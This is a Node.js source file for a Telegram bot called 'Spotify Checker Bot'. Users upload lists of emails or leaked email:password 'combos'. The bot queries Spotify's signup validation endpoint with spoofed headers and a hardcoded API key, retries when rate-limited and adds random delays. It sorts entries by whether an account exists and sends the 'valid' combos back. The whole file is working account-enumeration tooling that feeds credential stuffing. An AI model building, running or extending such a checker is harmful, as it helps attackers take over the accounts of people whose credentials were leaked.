const { Telegraf, Markup } = require('telegraf');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const express = require('express');

// ==============================================
// 🔑 BOT TOKEN — Set this in Render Dashboard later!
// ==============================================
const BOT_TOKEN = process.env.BOT_TOKEN;
const API_KEY = 'a1e486e2729f46d6bb368d6b2bcda326';
const CONCURRENCY = 5;

// Express health check — keeps bot alive on Render free tier
const app = express();
const PORT = process.env.PORT || 3000;
app.get('/', (req, res) => res.send('✅ Spotify Checker Bot is Running!'));
app.listen(PORT, () => console.log(`🌐 Keepalive server on port ${PORT}`));

const bot = new Telegraf(BOT_TOKEN, { handlerTimeout: 30000 });

const headers = {
  'authority': 'spclient.wg.spotify.com',
  'accept': '*/*',
  'content-type': 'application/json',
  'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
};

const clientInfo = {
  api_key: API_KEY,
  app_version: 'v2',
  capabilities: [1],
  installation_id: 'f3bb4c40-89f4-45b6-a3d6-0d22dd486182',
  platform: 'www',
};

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

async function checkEmail(email) {
  const jsonData = {
    fields: [{ field: 'FIELD_EMAIL', value: email.trim() }],
    client_info: clientInfo,
    tracking: { creation_point: 'https://open.spotify.com/artist/59YhsSefd7itecSNMp0Nv8' },
  };

  for (let attempt = 0; attempt < 2; attempt++) {
    try {
      const res = await axios.post(
        'https://spclient.wg.spotify.com/signup/public/v2/account/validate',
        jsonData,
        { headers, timeout: 8000 }
      );
      const resJson = res.data;
      if (resJson.error && String(resJson.error).includes('already_exists')) {
        return { status: 'VALID', item: email };
      } else if (resJson.success) {
        return { status: 'BAD', item: email };
      }
      return { status: 'UNKNOWN', item: email };
    } catch (err) {
      if (err.response?.status === 429) {
        await sleep(1500);
        continue;
      }
      return { status: 'ERROR', item: email, error: err.message };
    }
  }
  return { status: 'ERROR', item: email, error: 'Failed' };
}

const userMode = new Map();

bot.start((ctx) => {
  try {
    ctx.reply(
      `👋 Welcome to Spotify Checker Bot!\n\n📌 Choose a mode below:`,
      Markup.inlineKeyboard([
        [Markup.button.callback('📧 Check Emails Only', 'mode_emails')],
        [Markup.button.callback('🔐 Check Combos (email:pass)', 'mode_combo')]
      ])
    );
  } catch (e) { console.error('Start error:', e.message); }
});

bot.action('mode_emails', (ctx) => {
  userMode.set(ctx.chat.id, 'emails');
  ctx.answerCbQuery();
  ctx.reply('📧 Mode: **Email Only**\nSend me a .txt file — one email per line.', { parse_mode: 'Markdown' });
});

bot.action('mode_combo', (ctx) => {
  userMode.set(ctx.chat.id, 'combo');
  ctx.answerCbQuery();
  ctx.reply('🔐 Mode: **Combo Checker**\nSend: email:password per line.', { parse_mode: 'Markdown' });
});

bot.command('mode', (ctx) => {
  ctx.reply('🔄 Choose your mode:',
    Markup.inlineKeyboard([
      [Markup.button.callback('📧 Check Emails Only', 'mode_emails')],
      [Markup.button.callback('🔐 Check Combos', 'mode_combo')]
    ])
  );
});

bot.help((ctx) => {
  ctx.reply(`📖 Use /mode to switch modes, then send your .txt file!\n\n⚡ Concurrency: ${CONCURRENCY} parallel checks`);
});

async function processBatch(items, mode, onProgress) {
  const valid = [], bad = [], unknown = [], errors = [];
  let checked = 0;

  for (let i = 0; i < items.length; i += CONCURRENCY) {
    const batch = items.slice(i, i + CONCURRENCY);
    const promises = batch.map(async (item) => {
      const email = mode === 'emails' ? item : item.split(':')[0].trim();
      return checkEmail(email);
    });

    const results = await Promise.all(promises);

    for (const r of results) {
      if (r.status === 'VALID') valid.push(mode === 'emails' ? r.item : items.find(i => i.startsWith(r.item + ':')) || r.item);
      else if (r.status === 'BAD') bad.push(mode === 'emails' ? r.item : items.find(i => i.startsWith(r.item + ':')) || r.item);
      else if (r.status === 'UNKNOWN') unknown.push(r.item);
      else errors.push(`${r.item} - ${r.error}`);
    }

    checked += batch.length;
    onProgress(checked);
    await sleep(Math.floor(Math.random() * 40 + 10));
  }
  return { valid, bad, unknown, errors };
}

bot.on('document', async (ctx) => {
  try {
    const file = ctx.message.document;
    if (!file.file_name.endsWith('.txt')) {
      return ctx.reply('⚠️ Please send a .txt file only!');
    }

    const mode = userMode.get(ctx.chat.id) || 'combo';
    const modeLabel = mode === 'emails' ? '📧 Email-Only Mode' : '🔐 Combo Mode';
    await ctx.reply(`📥 Received: ${file.file_name}\n${modeLabel}\n⚡ Concurrency: ${CONCURRENCY}\n⏳ Starting...`);

    const fileLink = await ctx.telegram.getFileLink(file.file_id);
    const res = await axios.get(fileLink.href, { responseType: 'text', timeout: 30000 });
    
    let items = [];
    if (mode === 'emails') {
      items = res.data.split('\n').map(l => l.trim()).filter(l => l);
    } else {
      items = res.data.split('\n').filter(line => line.trim() && line.includes(':'));
    }
    
    if (items.length === 0) return ctx.reply('❌ No valid entries found!');

    const total = items.length;
    const progressMsg = await ctx.reply(`⏳ Progress: 0/${total} (0%)`);

    const results = await processBatch(items, mode, async (checked) => {
      if (checked % 20 === 0 || checked === total) {
        try {
          await ctx.telegram.editMessageText(
            ctx.chat.id, progressMsg.message_id, undefined,
            `⏳ Progress: ${checked}/${total} (${Math.round((checked/total)*100)}%)`
          );
        } catch {}
      }
    });

    const summary = 
      `✅ COMPLETE ✅\n\n📊 Total: ${total}\n🟢 Valid: ${results.valid.length}\n🔴 Bad: ${results.bad.length}\n🟡 Unknown: ${results.unknown.length}\n🔵 Errors: ${results.errors.length}`;
    await ctx.reply(summary);

    const outputPath = path.join(__dirname, 'outputs');
    if (!fs.existsSync(outputPath)) fs.mkdirSync(outputPath);

    fs.writeFileSync(path.join(outputPath, 'valid.txt'), results.valid.join('\n'));
    fs.writeFileSync(path.join(outputPath, 'bad.txt'), results.bad.join('\n'));
    fs.writeFileSync(path.join(outputPath, 'results.txt'),
      `=== VALID ===\n${results.valid.join('\n')}\n\n=== BAD ===\n${results.bad.join('\n')}\n\n=== UNKNOWN ===\n${results.unknown.join('\n')}\n\n=== ERRORS ===\n${results.errors.join('\n')}`
    );

    await ctx.replyWithDocument({ source: path.join(outputPath, 'valid.txt'), filename: 'valid.txt' });
    await ctx.replyWithDocument({ source: path.join(outputPath, 'bad.txt'), filename: 'bad.txt' });
    await ctx.replyWithDocument({ source: path.join(outputPath, 'results.txt'), filename: 'results.txt' });
    await ctx.reply('📤 All results sent! ✅');

    fs.rmSync(outputPath, { recursive: true, force: true });

  } catch (err) {
    console.error('❌ Processing error:', err.message);
    try {
      await ctx.reply(`⚠️ Error: ${err.message}`);
    } catch {}
  }
});

bot.catch((err, ctx) => {
  console.error('❌ Bot error:', err.message);
});

async function startBot() {
  try {
    console.log('🔄 Connecting to Telegram...');
    await bot.launch();
    console.log('✅ Bot is running! Check Telegram!');
  } catch (err) {
    console.error('❌ Failed to start:', err.message);
    process.exit(1);
  }
}

startBot();

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
